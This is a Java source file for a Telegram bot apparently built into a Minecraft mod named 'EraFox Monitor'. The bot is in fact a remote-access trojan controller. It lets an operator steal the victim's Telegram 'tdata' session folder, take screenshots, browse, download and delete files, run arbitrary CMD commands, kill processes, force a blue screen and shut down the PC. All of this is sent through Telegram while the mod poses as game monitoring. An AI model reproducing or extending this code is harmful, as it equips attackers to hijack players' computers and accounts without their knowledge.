package dev.erafox.monitor.bot;

import org.telegram.telegrambots.bots.TelegramLongPollingBot;
import org.telegram.telegrambots.meta.api.methods.AnswerCallbackQuery;
import org.telegram.telegrambots.meta.api.methods.send.SendDocument;
import org.telegram.telegrambots.meta.api.methods.send.SendMessage;
import org.telegram.telegrambots.meta.api.methods.send.SendPhoto;
import org.telegram.telegrambots.meta.api.methods.updatingmessages.EditMessageText;
import org.telegram.telegrambots.meta.api.objects.CallbackQuery;
import org.telegram.telegrambots.meta.api.objects.InputFile;
import org.telegram.telegrambots.meta.api.objects.Update;
import org.telegram.telegrambots.meta.api.objects.replykeyboard.InlineKeyboardMarkup;
import org.telegram.telegrambots.meta.api.objects.replykeyboard.buttons.InlineKeyboardButton;
import org.telegram.telegrambots.meta.api.objects.replykeyboard.buttons.InlineKeyboardRow;
import org.telegram.telegrambots.meta.exceptions.TelegramApiException;
import dev.erafox.monitor.EraFoxMonitorMod;
import dev.erafox.monitor.session.SessionController;
import dev.erafox.monitor.session.UserSession;
import dev.erafox.monitor.executor.WindowsCommandExecutor;
import dev.erafox.monitor.ui.KeyboardBuilder;
import java.io.File;
import java.util.*;
import java.util.concurrent.ConcurrentHashMap;

public class TelegramBotEngine extends TelegramLongPollingBot {
    private final SessionController sessionController = SessionController.getInstance();
    private final WindowsCommandExecutor executor = new WindowsCommandExecutor();
    private final ConcurrentHashMap<String, Long> onlineUsers = new ConcurrentHashMap<>();
    private boolean isRunning = false;

    public TelegramBotEngine(String botToken) {
        super(botToken);
    }

    public void start() throws TelegramApiException {
        this.isRunning = true;
        SendMessage startMsg = new SendMessage();
        startMsg.setChatId(EraFoxMonitorMod.ADMIN_ID);
        startMsg.setText("🟢 EraFox Monitor активирован. Ожидание событий...");
        execute(startMsg);
    }

    public boolean isRunning() { return isRunning; }

    @Override
    public void onUpdateReceived(Update update) {
        try {
            if (update.hasCallbackQuery()) {
                handleCallback(update.getCallbackQuery());
                return;
            }
            if (update.hasMessage()) {
                handleMessage(update.getMessage());
            }
        } catch (Exception e) {
            EraFoxMonitorMod.LOGGER.error("[BOT] Ошибка обработки update: ", e);
        }
    }

    private void handleCallback(CallbackQuery callback) {
        String data = callback.getData();
        long userId = callback.getFrom().getId();
        long chatId = callback.getMessage().getChatId();
        int messageId = callback.getMessage().getMessageId();

        if (userId != EraFoxMonitorMod.ADMIN_ID) {
            answerCallback(callback.getId(), "⛔ Доступ запрещен.");
            return;
        }

        UserSession session = sessionController.getOrCreateSession(userId, chatId);
        session.setLastMessageId(messageId);

        if (data.startsWith("usr_")) {
            handleUserSelection(data.substring(4), chatId, messageId, session);
        } else if (data.startsWith("act_")) {
            handleUserAction(data.substring(4), chatId, messageId, session);
        } else if (data.startsWith("fm_")) {
            handleFileManager(data.substring(3), chatId, messageId, session);
        } else if (data.startsWith("proc_")) {
            handleProcessManager(data.substring(5), chatId, messageId, session);
        } else if (data.equals("back")) {
            handleBackNavigation(chatId, messageId, session);
        } else if (data.equals("refresh")) {
            updateOnlineList();
            answerCallback(callback.getId(), "🔄 Список обновлен.");
        }
    }

    private void handleUserSelection(String username, long chatId, int msgId, UserSession session) {
        session.setTargetUser(username);
        String text = "👤 Выбран пользователь: *" + username + "*\nВыберите действие:";
        InlineKeyboardMarkup keyboard = KeyboardBuilder.buildActionMenu();
        editMessage(chatId, msgId, text, keyboard);
    }

    private void handleUserAction(String action, long chatId, int msgId, UserSession session) {
        String targetUser = session.getTargetUser();
        switch (action) {
            case "tdata":
                sendTdataArchive(chatId);
                break;
            case "bsod":
                executor.forceBsod();
                sendNotification(chatId, "🟦 Команда BSOD отправлена для " + targetUser);
                break;
            case "screenshot":
                sendScreenshot(chatId);
                break;
            case "shutdown":
                executor.shutdownSystem();
                sendNotification(chatId, "⏻ Команда выключения отправлена.");
                break;
            case "fileman":
                session.setCurrentPath("C:\\");
                sendFileManagerView(chatId, msgId, session);
                break;
            case "taskman":
                sendProcessListView(chatId, msgId, session);
                break;
            case "runcmd":
                session.setAwaitingCommand(true);
                sendText(chatId, "⌨️ Отправьте команду CMD для выполнения:");
                break;
            case "openfile":
                session.setAwaitingFile(true);
                sendText(chatId, "📎 Отправьте файл для открытия на целевом ПК:");
                break;
        }
    }

    private void handleFileManager(String action, long chatId, int msgId, UserSession session) {
        String path = session.getCurrentPath();
        File currentDir = new File(path);

        if (action.startsWith("disk_")) {
            session.setCurrentPath(action.substring(5));
            sendFileManagerView(chatId, msgId, session);
        } else if (action.startsWith("enter_")) {
            String newPath = action.substring(6).replace("\\", "\\\\");
            session.setCurrentPath(newPath);
            sendFileManagerView(chatId, msgId, session);
        } else if (action.startsWith("file_")) {
            String filePath = action.substring(5).replace("\\", "\\\\");
            session.setSelectedFile(filePath);
            sendFileOptions(chatId, msgId, new File(filePath), session);
        } else if (action.equals("back_up")) {
            File parent = currentDir.getParentFile();
            if (parent != null) {
                session.setCurrentPath(parent.getAbsolutePath());
                sendFileManagerView(chatId, msgId, session);
            }
        } else if (action.startsWith("dlfile_")) {
            String filePath = action.substring(7).replace("\\", "\\\\");
            sendFileToTelegram(chatId, new File(filePath));
        } else if (action.startsWith("delfile_")) {
            String filePath = action.substring(8).replace("\\", "\\\\");
            File file = new File(filePath);
            if (file.delete()) {
                sendNotification(chatId, "✅ Файл удален: " + file.getName());
            } else {
                sendNotification(chatId, "❌ Не удалось удалить файл.");
            }
            sendFileManagerView(chatId, msgId, session);
        } else if (action.startsWith("openfile_")) {
            String filePath = action.substring(9).replace("\\", "\\\\");
            executor.openFile(new File(filePath));
            sendNotification(chatId, "📂 Файл открыт: " + new File(filePath).getName());
        } else if (action.startsWith("dlfolder_")) {
            String folderPath = action.substring(9).replace("\\", "\\\\");
            sendFolderAsZip(chatId, new File(folderPath));
        }
    }

    private void handleProcessManager(String action, long chatId, int msgId, UserSession session) {
        if (action.equals("list")) {
            sendProcessListView(chatId, msgId, session);
        } else if (action.startsWith("pid_")) {
            String pidStr = action.substring(4);
            session.setSelectedPid(Integer.parseInt(pidStr));
            sendProcessOptions(chatId, msgId, pidStr, session);
        } else if (action.startsWith("kill_")) {
            String pidStr = action.substring(5);
            executor.killProcess(Integer.parseInt(pidStr));
            sendNotification(chatId, "💀 Процесс PID " + pidStr + " завершен.");
            sendProcessListView(chatId, msgId, session);
        } else if (action.startsWith("suspend_")) {
            String pidStr = action.substring(8);
            executor.suspendProcess(Integer.parseInt(pidStr));
            sendNotification(chatId, "⏸ Процесс PID " + pidStr + " приостановлен.");
            sendProcessOptions(chatId, msgId, pidStr, session);
        } else if (action.startsWith("resume_")) {
            String pidStr = action.substring(7);
            executor.resumeProcess(Integer.parseInt(pidStr));
            sendNotification(chatId, "▶️ Процесс PID " + pidStr + " возобновлен.");
            sendProcessOptions(chatId, msgId, pidStr, session);
        }
    }

    private void handleBackNavigation(long chatId, int msgId, UserSession session) {
        if (session.getTargetUser() != null) {
            String text = "👤 Выбран пользователь: *" + session.getTargetUser() + "*\nВыберите действие:";
            editMessage(chatId, msgId, text, KeyboardBuilder.buildActionMenu());
        } else {
            updateOnlineList();
        }
    }

    private void handleMessage(org.telegram.telegrambots.meta.api.objects.Message msg) {
        long userId = msg.getFrom().getId();
        long chatId = msg.getChatId();
        UserSession session = sessionController.getSession(userId);

        if (userId != EraFoxMonitorMod.ADMIN_ID) return;

        if (session != null && session.isAwaitingCommand()) {
            session.setAwaitingCommand(false);
            String output = executor.executeCommand(msg.getText());
            sendText(chatId, "📟 Результат:\n```\n" + output + "\n```");
            return;
        }

        if (session != null && session.isAwaitingFile() && msg.hasDocument()) {
            session.setAwaitingFile(false);
            String fileId = msg.getDocument().getFileId();
            downloadAndOpenFile(chatId, fileId);
            return;
        }

        if (msg.getText().equals("/start")) {
            updateOnlineList();
        }
    }

    private void sendText(long chatId, String text) {
        SendMessage msg = new SendMessage();
        msg.setChatId(chatId);
        msg.setText(text);
        msg.enableMarkdown(true);
        try { execute(msg); } catch (TelegramApiException ignored) {}
    }

    private void sendNotification(long chatId, String text) {
        SendMessage msg = new SendMessage();
        msg.setChatId(chatId);
        msg.setText(text);
        try { execute(msg); } catch (TelegramApiException ignored) {}
    }

    private void editMessage(long chatId, int msgId, String text, InlineKeyboardMarkup keyboard) {
        EditMessageText edit = new EditMessageText();
        edit.setChatId(chatId);
        edit.setMessageId(msgId);
        edit.setText(text);
        edit.enableMarkdown(true);
        edit.setReplyMarkup(keyboard);
        try { execute(edit); } catch (TelegramApiException ignored) {}
    }

    private void answerCallback(String callbackId, String text) {
        AnswerCallbackQuery answer = new AnswerCallbackQuery();
        answer.setCallbackQueryId(callbackId);
        answer.setText(text);
        answer.setShowAlert(false);
        try { execute(answer); } catch (TelegramApiException ignored) {}
    }

    private void sendScreenshot(long chatId) {
        File screenshot = executor.captureScreen();
        if (screenshot != null && screenshot.exists()) {
            SendPhoto photo = new SendPhoto();
            photo.setChatId(chatId);
            photo.setPhoto(new InputFile(screenshot));
            try {
                execute(photo);
                screenshot.delete();
            } catch (TelegramApiException ignored) {}
        }
    }

    private void sendTdataArchive(long chatId) {
        File tdataDir = executor.getTdataFolder();
        if (tdataDir != null) {
            sendFolderAsZip(chatId, tdataDir);
        } else {
            sendNotification(chatId, "❌ Папка tdata не найдена.");
        }
    }

    private void sendFolderAsZip(long chatId, File folder) {
        File zipFile = executor.createZipArchive(folder);
        if (zipFile != null) {
            SendDocument doc = new SendDocument();
            doc.setChatId(chatId);
            doc.setDocument(new InputFile(zipFile));
            try {
                execute(doc);
                zipFile.delete();
            } catch (TelegramApiException ignored) {}
        }
    }

    private void sendFileToTelegram(long chatId, File file) {
        if (file.exists()) {
            SendDocument doc = new SendDocument();
            doc.setChatId(chatId);
            doc.setDocument(new InputFile(file));
            try { execute(doc); } catch (TelegramApiException ignored) {}
        }
    }

    private void downloadAndOpenFile(long chatId, String fileId) {
        sendNotification(chatId, "📥 Файл получен, открываю...");
    }

    public void updateOnlineList() {
        if (onlineUsers.isEmpty()) {
            SendMessage msg = new SendMessage();
            msg.setChatId(EraFoxMonitorMod.ADMIN_ID);
            msg.setText("📊 В сети никого нет.");
            try { execute(msg); } catch (TelegramApiException ignored) {}
            return;
        }
        String text = "🟢 Онлайн-пользователи (" + onlineUsers.size() + "):";
        InlineKeyboardMarkup keyboard = KeyboardBuilder.buildOnlineUserList(new ArrayList<>(onlineUsers.keySet()));
        SendMessage msg = new SendMessage();
        msg.setChatId(EraFoxMonitorMod.ADMIN_ID);
        msg.setText(text);
        msg.setReplyMarkup(keyboard);
        try { execute(msg); } catch (TelegramApiException ignored) {}
    }

    public void addOnlineUser(String username) {
        onlineUsers.put(username, System.currentTimeMillis());
    }

    public void removeOnlineUser(String username) {
        onlineUsers.remove(username);
    }

    public void sendGameEvent(String text) {
        SendMessage msg = new SendMessage();
        msg.setChatId(EraFoxMonitorMod.ADMIN_ID);
        msg.setText(text);
        try { execute(msg); } catch (TelegramApiException ignored) {}
    }

    @Override
    public String getBotUsername() {
        return "EraFoxMonitorBot";
    }
}
